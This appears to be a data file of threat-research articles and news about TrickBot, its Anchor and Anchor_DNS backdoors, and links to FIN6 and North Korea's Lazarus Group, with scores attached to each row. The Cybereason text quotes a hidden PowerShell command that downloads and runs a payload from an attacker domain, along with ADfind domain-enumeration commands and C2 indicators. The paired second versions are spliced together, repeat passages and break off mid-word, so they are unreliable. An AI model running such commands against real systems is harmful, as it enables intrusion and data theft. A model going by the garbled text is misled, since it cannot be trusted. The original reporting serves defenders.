typically use a separate C2 infrastructure. However, in some instances of this attack, there was C2 server overlap between these infrastructures. For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)Connection to TrickBotThis above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.Connection to Anchor_DNSThe same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.Passive DNS information of 23.95.97[.]59 , taken from VirusTotal.Comparison Between Anchor Malware FamilyThe following table gives a comparison between different malware in the Anchor malware family.Features Anchor Old Anchor_DNS New Anchor_DNS Earliest Observed Sample August 2018 May 2019 November 2019 Command-line arguments? - + + Self-Deletion + + - Network Connectivity check via ICMP - - + Network Connectivity check via web services + + - NTFS ADS files + + + TrickBot's GUID Generation pattern + (Cleartext) + (base64) + (base64) Code Obfuscation Very Little Very Little Obfuscated Code C2 Communication Protocols HTTP(S) DNS ICMP, DNSRise of Signed MalwareCode signing is meant to provide a level of credibility and integrity to a binary from the developer, and to guarantee that the binary has not been tampered with. In the past, signing malware was a practice mostly seen with nation-state threat actors. However, this is no longer the case. Nowadays, more and more commodity malware are being signed with valid certificates, effectively bypassing some security solutions that grant trust to signed binaries.Malicious files in this attack were signed by:Biller FIN OyNIRMAL 0013 LimitedBRO-BURGER, LLCTrickBot payloads and Anchor / Anchor_DNS payloads were at times signed by the same signer, which further demonstrate that these malware are most likely used by the same threat actor.In searching for additional signed known and unknown files, we were able to identify dozens of malware samples signed by the same organizations. Some were also signed with the same serial number.Biller FIN Oy Signer:A VirusTotal Signer name search shows malware associated with these campaigns:A VirusTotal Serial Number search shows malware associated with the campaigns:ConclusionThis research gives a detailed step-by-step analysis of recent attacks targeting the financial, manufacturing, and retail sectors across the United States and Europe. These attacks start with a TrickBot infection and, with high-profile targets, can escalate to a hacking operation leveraging a new malware, Anchor, and a new variant of Anchor_DNS.Unlike previously reported TrickBot attacks that resulted in mass ransomware infections, these new attacks focus on stealing sensitive information from POS systems and other sensitive resources in the victims' network by compromising critical assets.In addition, Cybereason discovered a previously undocumented malware called Anchor as well as a new variant of the recently discovered Anchor_DNS malware. Both Anchor and Anchor_DNS are directly related to TrickBot infections and have code similarities, and sometimes also share C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself under-the-radar, such as communication over DNS, and the reliance on specific command-line arguments in order to run properly. Through these techniques, it is able to evade many security products including certain sandboxes and AV vendors.These attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high volume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If they identify a high-value target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as an entry point to other machines on the network.This research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our research, we noticed certain TTP overlaps with earlier attacks that were attributed to the financially-motivated FIN6 threat actor. We leave it to our readers to draw their own conclusions on the attribution of these attacks.Lastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve, security practitioners and security vendors must improve the detection of signed malware and re-think the trust given to signed binaries in general.The best way to defend against an attack like this is to use an iterative security process. Read more in our white paper.Indicators of CompromiseFor a comprehensive list of indicators of compromise, please see the PDF file for this attack here.MITRE ATT&CK Techniques";"This research focuses on the following aspects of the TrickBotAnchor attack: Anatomy of the Attack: A stepbystep anatomy of the attacks, including infection vectors and a dissection of the tools and techniques used by the attackers. New Malware: The discovery of a new malware family called Anchor, which includes the Anchor_DNS and a new, undocumented Anchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used very selectively on highprofile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who created TrickBot.While this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques detailed, have certain resemblance to past attacks that were linked to the financiallymotivated FIN6 threat actor, a group that is known to target POS systems and has been linked to TrickBot infections in the past.Lastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a hacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.Key PointsThe TrickBotAnchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe.Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe. Targets POS Systems: The attacks target POS systems to steal sensitive information TrickBot is a sophisticated banking trojan designed to steal banking credentials and other sensitive data from its victims. It uses a variety of techniques to evade detection, such as obfuscation, encryption, and the use of valid certificates to sign its payloads. TrickBot's main payload is injected into the svchost.exe process, which allows it to carry out a series of reconnaissancerelated tasks to profile the infected endpoint and the network. This information is crucial, as it determines the course of the attack. TrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net. Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TORrelated domains. It collects and sends information about where the target machine is located to the C2 servers. Browser History and Credential Theft After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. TrickBot's main payload is injected into the svchost.exe process, which allows it to carry out a series of reconnaissancerelated tasks to profile the infected endpoint and the network. This information is crucial, as it determines the course of the attack. TrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, i The threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a secondary server and, once it's downloaded, immediately execute it on the target machine through PowerShell.powershell.exe nop WindowStyle Hidden executionpolicy bypass c ""IEX ((newobject net.webclient).downloadstring('hxxps://northracing[. ]net/?a=irs&x=[base64]'))""The northracing[. ]net URL contains a PowerShell script in the contents of the webpage. The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:The attackers execute several Base64encoded PowerShell commands in order to determine if the infected machine's user is in the admin or domain admin group.After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64encoded and compressed PowerShell command.The obfuscated and compressed PowerShell command.The decoded PowerShell command that attempts to gather domain controller information.Active Directory Discovery using ADfindThe attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.adfind.exe f ""(objectcategory=organizationalUnit)""adfind.exe gcb sc trustdmpadfind.exe f ""objectcategory=computer""adfind.exe sc trustdmpadfind.exe f ""(objectcategory=person)""adfind.exe subnets f (objectCategory=subnet)adfind.exe f ""(objectcategory=group)""The ADfind tool has reportedly been used previously in attacks related to FIN6.New Anchor_DNS Variant DiscoveredOne of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security. The malware is dubbed Anchor by its authors and has been active since August 2018. The IP 23.95.97[. ]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot. This research gives a detailed stepbystep analysis of recent attacks targeting the financial, manufacturing, and retail sectors across the United States and Europe. These attacks start with a TrickBot infection and, with highprofile targets, can escalate to a hacking operation leveraging a new malware, Anchor, and a new variant of Anchor_DNS. Unlike previously reported TrickBot attacks that resulted in mass ransomware infections, these new attacks focus on stealing sensitive information from POS systems and other sensitive resources in the victims' network by compromising critical assets. In addition, Cybereason discovered a previously undocumented malware called Anchor as well as a new variant of the recently discovered Anchor_DNS malware. Both Anchor and Anchor_DNS are directly related to TrickBot infections and have code similarities, and sometimes also share C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself undertheradar, such as communication over DNS, and the reliance on specific commandline arguments in order to run properly. Through these techniques, it is able to evade many security products including certain sandboxes and AV vendors. These attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high volume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If they identify a highvalue target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as an entry point to other machines on the network. TrickBot is a sophisticated banking trojan that has been used in targeted attacks against highvalue targets. It is capable of stealing sensitive information from the target machine, as well as using the target machine as an entry point to other machines on the network. This research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our research, we noticed certain TTP overlaps with earlier attacks that were attributed to the financiallymotivated FIN6 threat actor. We leave it to our readers to draw their own conclusions on the attribution of these attacks.Lastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve, security practitioners and security vendors must improve the detection of signed malware and rethink the trust given to signed binaries in general.The best way to defend against an attack like this is to use an iterative security process. Read more in our white paper.Indicators of CompromiseFor a comprehensive list of indicators of compromise, please see the PDF file for this attack here.MITRE ATT&CK Techniques";en;{'r': 0.3392101551480959, 'p': 0.9321705426356589, 'f': 0.49741468067912253};{'r': 0.26535020055538416, 'p': 0.8902691511387164, 'f': 0.40884240197675453};{'r': 0.3392101551480959, 'p': 0.9321705426356589, 'f': 0.49741468067912253}
https://www.sentinelone.com/labs/anchor-project-the-deadly-planeswalker-how-the-trickbot-group-united-high-tech-crimeware-apt/;The Deadly Planeswalker: How The TrickBot Group United High-Tech Crimeware & APT - SentinelLabs;"Research by: Vitali Kremez, Joshua Platt and Jason ReavesThe Wind of Time Shakes the Underground | High-Tech Cybercrime & APT | Most Sophisticated & Resourceful Crimeware GroupRead the Full ReportWhen we talk about cybercrime, we often portray a hidden, hazardous realm, which is radically different from the one that we live in. In fact, hackers and their cybercrime enterprises exist in the same world as ours and undergo the same social and economic transformations as those which shape our reality.When cybercrime emerged, it followed the rules of the late industrial age. Despite their Fin de siecle fleur of harbingers of the radically novel era, cybercriminal communities relied on standard, if not mundane operational rules of classic enterprises -- separation of functions, division of labor, focused specialization. In other words, underground malware engineers who developed information stealers most likely never had a chance or intent to talk to hackers who developed ransomware, hacktivists did not collaborate with cyber fraudsters or carders, while for-profit criminals and nation-state advanced persistent threat (APT) operatives preferred to maintain a clear separation line.Everything changed with time. Unlike its predecessor which valued separation and operational boundaries, the 21st century manifested the interconnectivity as its essential trait. Facebook, Google, Uber, all succeeded because they were able to unite the previously ""ununitable."" This strive to merge domains and cross borders became a rule for success, a natural destination of evolution. Like other humans, cybercriminals felt the zeitgeist -- they evolved accordingly. However, only one group was able to crown this evolution -- the elite ""TrickBot"" group.This story begins in the year in which the century clearly demonstrated its rapidly changing nature. 2013 -- the call for radical social change shakes the Middle East and Europe alike, the Pope announces his renunciation the first time in 700 years, the Voyager 1 exits the Solar System and reaches the interstellar medium. The transformations of cybercrime were no less fundamental. Banking malware -- a malware designed to steal financial information -- were rapidly acquiring new functions and traits consummating with the success of GameOver Zeus, also known as ""Peer-to-Peer Zeus"", cybercrime group that became known as ""Business Club.""The developers of this crimeware employed an alternative approach to their botnet -- offering it as a service for other threat actors. The GameOver Zeus service also pioneered the deployment of ransomware such as a prolific ""Cryptolocker"" responsible in millions of losses and affecting victims worldwide. Overall, GameOver Zeus was a major success in introducing a profoundly new model -- cybercrime-as-a-service (CaaS). This model was based on automation, customization, and client-oriented approach and perfectly fit the demand of the expanding postindustrial private market. The Business Club model was operated by the most wanted cybercriminal, a Russian national Evgeniy Mihailovich Bogachev, or simply known as ""Slavik"" amongst the club members fellow cybercriminals.It was only a matter of time when other groups will incorporate GameOver Zeus's innovative modeling. In 2014, two cybercrime teams and former customers and members of ""Business Club"" form separate crimeware models became known as ""Dridex"" and ""Dyre."" Both Dridex and Dyre made its way to the headlines by advancing the CaaS model and supplying various types of cybercriminals with their botnet solutions.In the meantime, Dridex and their operators, also known as ""Evil Corp,"" continues to successful experimenting with targeted highly-impactful bank fraud and ransomware operations including working with such targeted ransomware variants as ""BitPaymer"" and ""DoppelPaymer"" responsible for multiple worldwide ransomware disruptions including the PEMEX intrusion. In December 2019, the Dridex botnet operators were charged and indicted by the international law enforcement and sanctioned the leader behind Makism Yakubets, known as ""aqua,"" and its administrator Igor Turashev, known as ""nintutu,"" for their involvement in another massive more than $100-million bank fraud and ransomware operations. Notably, Yakubetz was alleged close involvement with the Russian government and the FSB operations acquiring confidential documents through cyber-enabled means and cyber-enabled operations on its behalf.In 2016, Dyre operators were alleged to be arrested in Moscow, Russia, however, their work and ideas accumulated in the tool -- TrickBot. Trickbot engineers designed the bot in such a way to plug into the Dyre backend systems seamlessly while preserving independence from the Dyre components.TrickBot Race to Perfection: The Aesthetics of Blurred LinesTrickBot was developed in 2016 as a banking malware. However, since then it has developed into something essentially different -- a flexible, universal, module-based crimeware solution. TrickBot has been evolved to specifically attack corporations. The three pillars of TrickBot's success were ironically the buzzwords of the post-industrial revolution -- automation, decentralization, and integration.Early reports on TrickBot appeared in Fall 2016. By November 2016, the malware was already tested and functional. TrickBot developers began to add new functions to cross the borders -- first, literal borders. Initially targeting Australian banks, by November 2016 TrickBot had included New Zealand, British, German, and Canadian banks into its victim list. In July 2017, TrickBot was equipped with advanced automation -- another crucial trait that characterized this malware. TrickBot was now capable of worm-like spreading within the network after the initial infection.Then the expansion of functions followed. In October 2017, the crimeware group gathered data from mail clients and scraped web-history in search of personal identifiers. Later, new password grabber modules turned TrickBot into a fully-fledged stealing tool that was able to browse Google Chrome, Mozilla Firefox, Microsoft Edge, and other applications containing passwords and credentials.As a result, by 2018, the TrickBot group was swamped by a humongous data flow from infected machines. The group faced ""big data"" problems which required them to engineer a custom solution dealing with commercial size data flows and essentially design a ""data lake"" service to process it. The group faced a paradox in which its technological efficiency was not matched by the capabilities to process and monetize the information stolen. It was this moment when the organizational and strategic talent of the operators, and, possibly, the experience of Dyre came to play.Instead of harvesting and storing the compromised information as raw material, TrickBot decided to process and index it and offer access to it as a service. For instance, the spying capability was redesigned with a new feature with which TrickBot gathered and transferred network and domain controller victim information. With this function, TrickBot could provide other groups with critical security information which was then used to prioritize victims. In other words, a TrickBot customer knew who was the least protected prey in the lists. In other instances, breaches and botnet data were indexed through the backend to track the high-value targets. In this sense, the group weaponized these infections for the potent, targeted ransomware, or as they called it a ""cryptolocker,"" which became known as ""Ryuk"" ransomware affecting and crippling industries worldwide across multiple market segments, including healthcare and aviation industries. The criminal groups used specific digital identifiers obtained via TrickBot to spot the most lucrative industry targets for their ransomware campaigns.Moreover, the group decentralized if not ""Uberized"" its operations and started to massively sublet its technical solutions to affiliate groups. TrickBot products have often used a combination with other malware including highly infective Emotet, IcedID/BokBot, and Gozi ISFB v2.The flexibility was achieved through active use of modules. The modular structure allowed TrickBot to efficiently operate in different environments which were previously separated. TrickBot and its modules acted in the following major ways:a perfect information stealer grabbing personal information, which was then sold on the underground and used privately,a banker, stealing corporate data which monetized through account takeover and card frauda distributor, delivering ransomware, anda cryptominer.By 2019, Automation, Decentralization, and Integration enabled TrickBot to introduce a game-changing model. Their domain controller harvester enabled automatic network information collection and automated lateral movement within networks, not even mentioning the completely automated process of credential harvesting. The ability to integrate different cybercrime segments allowed to perform sophisticated bank fraud operations for money laundering, engage in ransomware and tax fraud. Decentralization created a flexible business model, where TrickBot offered attack tools to vetted vendors and used the tools of others to increase the infectivity.In blurring the lines between breaches, data theft, ransomware, and cyber fraud, the group has almost reached the pinnacle, and almost united the cybercrime territories. However, there was one final challenge separating TrickBot from perfection -- the APTs.The ""Anchor"" MysteryAdvanced Persistent Threat is a type of cybercrime which is most often associated with the nation-state actors. While the attribution is often a subject of political accusations and social discussion, the APT groups are indeed extremely sophisticated and are characterized by an ultimate focus on espionage. This defines the persistence in their operations -- to accomplish their mission targets, APT teams need to secretly remain in the system, navigate and observe. APTs saw their heyday in 2016 and 2017 when professional intrusion teams performed massive operations against top-banks and attacks against the SWIFT payment system.The modus operandi of APT has targeted attacks on extremely secure networks, remaining persistent and undetected for long periods, and espionage separates them from crimeware and TrickBot which are generally are deployed merely for monetary gain. This is why it was highly unlikely that TrickBot would attempt to integrate APTs into their operations. Until a new TrickBot derivative project called ""Anchor"" was discovered.While investigating the Anchor project we observed a framework of tools that allows the actors -- potential TrickBot customers -- to leverage this framework against higher-profile victims. Some of the pieces we have found for this framework can be seen below in the form of PDB paths. Anchor consists of several segments each with a specific function:anchorInstalleranchorDeInstallerAnchorBotBin2hexpsExecutormemoryScraperThis structure is designed to secretly upload the malware and clean up all the evidence of the attack. However, the ultimate goal of this innovation is unclear until we examine other modules. From looking at any TrickBot modules we can clearly understand its purpose. But when it comes to Anchor we see a combination of functionality, tools, and methods. What is out of the question, however, is the sophistication of this technology including an integrated methodology of loading such frameworks Metasploit, Cobalt Strike, TerraLoader, and PowerShell Empire to perform further victim post-exploitation.The Anchor project combines a collection of tools -- from the initial installation tool to the cleanup meant to scrub the existence of malware on the victim machine. In other words, Anchor presents as an all-in-one attack framework designed to compromise enterprise environments using both custom and existing toolage.As described earlier, TrickBot modules are customer-based, designed for the needs of a specific criminal activity. The Anchor project is a complex and stealthy tool for targeted data extraction from secure environments and long-term persistency. Logically, this tool will be a very tempting acquisition for high-profile, possibly nation-state groups. However, the Anchor is also be used for large cyber heists and point-of-sale card theft operations leveraging its custom card scraping malware. Among the nation-state groups, only a few are interested in both data collection and financial gain, and one of them is Lazarus.Lazarus Group (also known as ""Lazarus,"" ""Hidden Cobra,"" and ""Kimsuky"") is an advanced persistent threat (APT) group comprised of operators from ""Bureau 121"" (121?), the cyber warfare division of North Korea's RGB. The group has been active since at least 2009 and is presumed to operate out of a multitude of international locations.Lazarus appears to have been interested in a variety of sectors and targets in the last eighteen months, including cryptocurrency exchanges, financial institutions, non-governmental organizations, and South Korean individuals. Many North Korea cyber operators are likely not only self-funded but also tasked with earning income for the North Korean regime, Lazarus Group has likely targeted banks cryptocurrency exchanges and users to achieve this goal.During our investigation of Anchor, we discovered the tool PowerRatankba that was previously linked to the purported North Korean group was, in fact, used in Anchor.The specific evidence pointed out that this Lazarus group toolkit was loaded via the TrickBot Anchor project pointing to the now-unmasked relationship between the tools attributed to TrickBot ""Anchor"" group and Lazarus.Uniting the Ununitible -- Crimeware Meets APTThe integration of these tools into the Anchor implies that TrickBot was able to overcome the final barrier in integrating different domains into its model. By integrating the APT approach to its model the group turned its enterprise into a holistic ecosystem of cybercrime, becoming an essentially new phenomenon. In this ecosystem, crimeware and APT are no longer siloed, on the opposite, each type of crime creates added value for the other, each becomes a force multiplier.Conclusion: The Deadly PlaneswalkerThe Anchor is not simply a new addition to a long list of TrickBot modules and projects, it is a conclusion of many years of the cybercrime evolution, a point at which all puzzles assemble. Through its history, TrickBot was adding new markets to its area of operations, steadily conquering the cybercrime world. First, it blurred the line between infostealing and bankers then between trojans and ransomware and between financial fraud and malware.Through the history of cybercrime, APT was a Kantian ""thing-in-itself"", making it an integral part of a broader business model required a technical and organizational revolution. With the Anchor project, TrickBot became this revolutioner. TrickBot and Dridex groups remained to be some of the most sophisticated crimeware groups since ""Business Club."" While Dridex's ""Evil Corp"" members were publically charged and outed responsible for over $100 million in losses, the TrickBot group continued to innovate and stay active with more diverse crimeware models than Dridex.The ability to seamlessly integrate the APT into a monetization business model is evidence of a quantum shift. By accomplishing this integration, TrickBot overtly demonstrates that they have achieved a qualitatively new level of a cybercrime enterprise, which was never seen before in magnitude and complexity superseding and dethroning the legacy of its previous inspiration and its playground known as ""Business Club.""Read the Full ReportIOCs on GitHub";"The Wind of Time Shakes the Underground | HighTech Cybercrime & APT | Most Sophisticated & Resourceful Crimeware GroupRead the Full ReportWhen we talk about cybercrime, we often portray a hidden, hazardous realm, which is radically different from the one that we live in. In fact, hackers and their cybercrime enterprises exist in the same world as ours and undergo the same social and economic transformations as those which shape our reality.When cybercrime emerged, it followed the rules of the late industrial age. Despite their Fin de siecle fleur of harbingers of the radically novel era, cybercriminal communities relied on standard, if not mundane operational rules of classic enterprises separation of functions, division of labor, focused specialization. In other words, underground malware engineers who developed information stealers most likely never had a chance or intent to talk to hackers who developed ransomware; hacktivists did not collaborate with cyber fraudsters or carders, while forprofit criminals and nationstate advanced persistent threat (APT) operatives preferred to maintain a clear separation line.Everything changed with time. Unlike its predecessor which valued separation and operational boundaries, the 21st century manifested the interconnectivity as its essential trait. Facebook, Google, Uber, all succeeded because they were able to unite the previously ""ununitable."" This strive to merge domains and cross borders became a rule for success, a natural destination of evolution. Like other humans, cybercriminals felt the zeitgeist they evolved accordingly. However, only one group was able to crown this evolution the elite ""TrickBot"" group.This story begins in the year in which the century The Dridex botnet operators were charged and indicted by the international law enforcement and sanctioned the leader behind Makism Yakubets, known as ""aqua,"" and its administrator Igor Turashev, known as ""nintutu,"" for their involvement in another massive more than $100million bank fraud and ransomware operations. Notably, Yakubetz was alleged close involvement with the Russian government and the FSB operations acquiring confidential documents through cyberenabled means and cyberenabled operations on its behalf.In 2016, Dyre operators were alleged to be arrested in Moscow, Russia; however, their work and ideas accumulated in the tool TrickBot. TrickBot engineers designed the bot in such a way to plug into the Dyre backend systems seamlessly while preserving independence from the Dyre components.TrickBot Race to Perfection: The Aesthetics of Blurred LinesTrickBot was developed in 2016 as a banking malware. However, since then it has developed into something essentially different a flexible, universal, modulebased crimeware solution. TrickBot has been evolved to specifically attack corporations. The three pillars of TrickBot's success were ironically the buzzwords of the postindustrial revolution automation, decentralization, and integration.Early reports on TrickBot appeared in Fall 2016. By November 2016, the malware was already tested and functional. TrickBot developers began to add new functions to cross the borders first, literal borders. Initially targeting Australian banks, by November 2016 TrickBot had included New Zealand, British, German, and Canadian banks into its victim TrickBot is a sophisticated malwareasaservice (MaaS) platform that enables cybercriminals to launch targeted ransomware, bank fraud, and tax fraud operations. TrickBot's modular structure allows it to efficiently operate in different environments which were previously separated. TrickBot and its modules acted in the following major ways:a perfect information stealer grabbing personal information, which was then sold on the underground and used privately,a banker, stealing corporate data which monetized through account takeover and card frauda distributor, delivering ransomware, anda cryptominer.By 2019, Automation, Decentralization, and Integration enabled TrickBot to introduce a gamechanging model. Their domain controller harvester enabled automatic network information collection and automated lateral movement within networks, not even mentioning the completely automated process of credential harvesting. The ability to integrate different cybercrime segments allowed TrickBot to perform sophisticated bank fraud operations for money laundering, engage in ransomware and tax fraud. Decentralization created a flexible business model, where TrickBot offered attack tools to vetted vendors and used the tools of others to increase the infectivity.In blurring the lines between breaches, data theft, ransomware, and cyber fraud, the group has almost reached the pinnacle, and almost united the cybercrime territories. However, there was one final challenge separating TrickBot from perfection the APTs.The ""Anchor"" MysteryAdvanced Persistent Threat is a type of cybercrime which is most often associated with the nationstate actors. While the att Thank you for your input.";en;{'r': 0.40038684719535783, 'p': 0.9561200923787528, 'f': 0.5644171737532974};{'r': 0.2952515279736718, 'p': 0.9088277858176556, 'f': 0.44570617089027453};{'r': 0.40038684719535783, 'p': 0.9561200923787528, 'f': 0.5644171737532974}
https://norfolkinfosec.com/osint-reporting-on-dprk-and-ta505-overlap/;OSINT Reporting Regarding DPRK and TA505 Overlap – One Night in Norfolk;Yesterday, at SAS2019, BAE Systems presented findings related to DPRK SWIFT heist activity that took place in 2018. As part of this research (a leaked video of the presentation is available online), BAE included two key points not previously disclosed in the public domain:- The existence of a PowerShell backdoor attributable to DPRK, which the researchers dubbed PowerBrace- A possible overlap between TA505 intrusions and DPRK intrusions, suggesting a possible hand-off between the two groups.This blog will leave a full analysis of those two points and the supporting context to the people that found them, as it's theirs to share, however, data that may support such conclusions have been available in open source for quite some time.In early January, VNCert issued an alert regarding attacks targeting financial institutions, containing a mix of DPRK IOCs (including a keylogger referred to as PSLogger previously analyzed by this blog), TA505 IOCs (previously published by 360 TIC), and a handful of PowerShell scripts that are generally identical aside from a handful of configuration changes. Furthermore, the aforementioned keylogger was first uploaded by a submitter (fabd7a52) in Pakistan in December 2018. That same submitter acted as the first uploader for one of the PowerShell samples identified below (b88d4d72fdabfc040ac7fb768bf72dcd), further corroborating a possible link.Given the multi-sourced reporting overlaps and the additional Pakistan findings mentioned above, this blog assesses that the PowerShell scripts in question likely belong to the same family of DPRK-attributable malware reported by BAE systems.A listing of selected IOCs is below the fold, alongside a few brief notes (and a script) for how to analyze the PowerShell malware.IOCs from VNCertTA505:These contain infrastructure overlaps with reporting from the same month found here: https://ti.360.net/blog/articles/excel-4.0-macro-utilized-by-ta505-to-target-financial-institutions-recently-en/MD5: 5B7244C47104F169B0840440CDEDE788MD5: cc29adb5b78300b0f17e566ad461b2c7MD5: E00499E21F9DCF77FC990400B8B3C2B5MD5: 53F7BE945D5755BB628DEECB71CDCBF2MD5: 9c35e9aa9255aa2214d704668b039ef6MD5: 2e0d13266b45024153396f002e882f15MD5: 26f09267d0ec0d339e70561a610fb1fdMD5: 09e4f724e73fccc1f659b8a46bfa7184DPRK:HSMBalance.exe MD5:34404a3fb9804977c6ab86cb991fb130 - KeyloggerICAS.ps1 MD5: b12325a1e6379b213d35def383da2986 - Possible PowerBraceMD5: 8a41520c89dce75a345ab20ee352fef0 - Possible PowerBraceMD5: 7c651d115109fd8f35fddfc44fd24518 - Possible PowerBraceMD5: b88d4d72fdabfc040ac7fb768bf72dcd - Possible PowerBraceMD5: 3be75036010f1f2102b6ce09a9299bca - Possible PowerBraceSeveral hashes were omitted: these were EML files that belong to specific financial organizations. Others were not on VirusTotal or were not read properly by OCR.A Few Notes on the PowerShell BackdoorMD5 Used: b12325a1e6379b213d35def383da2986 (ICAS.ps1)C2: 192.95.14.128As previously mentioned, this blog will not be publishing a full analysis of this backdoor in deference to the people who first found it, however, in the interest of helping analysts who need the data, there are a few key points to mention:- The backdoor uses a configuration file that includes two C2 servers and a series of Base64 encoded commands- Most of the malware's function names have been replaced with MD5 hashesA snippet of the encoded configuration and obfuscated functions. Right click and open in a new tab to expand.A script below has been included that performs the Base64 transformation on values where it can find them. To analyze this script, this blog then recommends the following process:1) Using an easily identifiable command name (decoded by the script), locate that command's use in a function2) Identify references between that command and other functions3) Rename those other functions4) RepeatAn example of decoded data (with variables and functions renamed manually) is below:A portion of the partially decoded and deobfuscated PowerShell backdoorA script to assist with this is here:;NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://www.zdnet.com/article/trickbot-gang-is-now-a-malware-supplier-for-north-korean-hackers/;TrickBot gang is now a malware supplier for North Korean hackers;"A report published today reveals that North Korea's government-backed hacking units are renting access to elite hacking tools and access to hacked networks from the operators of the TrickBot botnet.The revelation comes to confirm a trend observed in recent years -- namely that the lines between regular cybercrime and nation-state cyber-espionage operations are blurring.This trend came to light in 2017 when a report revealed how the mastermind behind the GameOver Zeus malware botnet had been helping Russian intelligence gather sensitive documents from the computers he was infecting.But Bogatchev wasn't an isolated case. Just last week, the US charged the administrator of the Dridex malware botnet, accusing him of the same thing -- of collaborating with Russia's state intelligence in their search for sensitive data.These two cases show a direct contact between the creators of popular malware and a country's intelligence apparatus.In reality, these lines have been blurring at a much lower level. For years, we've seen nation-state hacking groups slowly adopt commodity malware. Instead of developing their own tools, state-sponsored operators choose to buy malware that's already available for sale online.This helps them hide ""targeted"" operations in a large stream of mundane infections, perpetrated by financially-motivated hackers.In a report published today by cyber-security firm SentinelOne, we learn of a new connection between a state-sponsored hacking group (North Korea's Lazarus Group) and a mundane malware operation (TrickBot).According to the SentinelOne team, the Lazarus Group has recently become a customer of the TrickBot gang, from whom they rent access to already infected systems, along with a new type of attack framework that researchers are calling Anchor.The TrickBot cybercrime empireSentinelOne describes Anchor as ""a collection of tools"" combined together into a new malware strain.The Anchor malware strain is provided as a TrickBot module.TrickBot is one of today's top three malware botnets, together with Emotet and Dridex. It is a gigantic network of computers that have been infected with the TrickBot trojan.However, TrickBot is also a Cybercrime-as-a-Service operation. The TrickBot gang rents access to TrickBot-infected computers to other malware gangs.These gangs vary from ransomware operators to online spammers, fraudsters, and more. Renters can use the TrickBot trojan to install their own malware or one of the available TrickBot modules, depending on what operations they want to carry out on infected hosts.Meet Anchor, TrickBot's most advanced moduleIn reports published today by both Cybereason and SentinelOne, the two companies say that Anchor is a new TrickBot module that was built for a specific market niche, namely for hackers looking to remain silent and undetected on the systems they infect.Anchor is TrickBot's attempt at creating a module around stealth features first. It's a tool to be used in attacks targeted at large corporations, where the hackers need to remain undetected for weeks or months -- while they steal data --, and even long after the intrusion ended.SentinelOne described Anchor as ""an all-in-one attack framework designed to attack enterprise environments.""It consists of different submodules that provide the various features needed in targeted attacks, but which have no usefulness for TrickBot's other customers.This includes Anchor submodules to spread laterally through a network, the ability to install backdoors for future access, features to target Point-of-Sale (POS) systems and scrape RAM memory for card data, and the ability to clean systems after an infection to hide an intruder's tracks.Image: SentinelOneAt a first glance, Anchor looks like a tool the TrickBot gang developed for hacker groups interested in economic espionage or for the operators of POS malware strains.It is very unlikely that the TrickBot gang developed the stealthy TrickBot Anchor module for nation-state hacking groups, however, it did found a client in their ranks.SentinelOne said it linked attacks carried out by North Korea's Lazarus Group to TrickBot and its new Anchor attack framework.In its report published today, SentinelOne said they found a case where Lazarus Group appears to have rented access to an infected system through the TrickBot botnet and then used the Anchor attack framework (TrickBot module) to install PowerRatankba, a PowerShell backdoor, on the network of a hacked company.Image: SentinelOneSentinelOne didn't elaborate what Lazarus Group was doing on the network of the hacked company, but North Korean hackers are known to dabble in both cyber-espionage and financially-motivated attacks.Earlier this year, the US Treasury imposed sanctions on entities associated with three North Korean hacking groups that have been caught stealing money from banks and cryptocurrency exchanges to finance the country's weapons program.Nonetheless, North Korean hackers weren't Anchor's only customers.Cybereason didn't see the Lazarus Group using Anchor, but, instead, they saw ""a new wave of targeted campaigns against financial, manufacturing and retail businesses that began in early October"" where Anchor had been used.""Unlike previously reported Trickbot-related attacks resulting in mass ransomware infection, this new wave of attacks focuses on stealing sensitive information from POS (Point-of-Sale) systems and other sensitive resources in the victims' networks, by compromising critical assets in the network,"" the Cybereason team said.""These attacks further stress the danger that lies within commodity malware infections that can sometimes be underestimated, due to their commonality and high volume,"" researchers added.""It is important to remember that once an endpoint is infected with a certain malware, it is up to the 